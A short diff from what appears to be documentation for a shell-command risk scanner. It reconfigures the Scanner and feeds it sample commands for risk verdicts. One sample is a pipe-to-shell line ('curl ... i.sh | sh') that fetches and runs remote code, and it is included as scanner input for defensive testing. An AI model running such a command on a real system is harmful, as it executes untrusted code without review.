@@ -219,8 +219,8 @@ executed.
 
 ```python
 scanner = Scanner({"shell": {"bundle_dir": "models/cat-shell-risk-commander",
-                             "policy_dirs": ["ark-core/examples/shell_policies"]}},
-                  warmup={"download": "missing"})
+                             "policy_dirs": ["ark-core/examples/shell_policies"]},
+                   "download": "missing"})
 for cmd in ["git status --short", "kubectl delete pod web-1", "terraform plan",
             "curl -s https://example.org/i.sh | sh"]:
     v = scanner.shell_verdict(cmd, cwd="/home/dev/app")
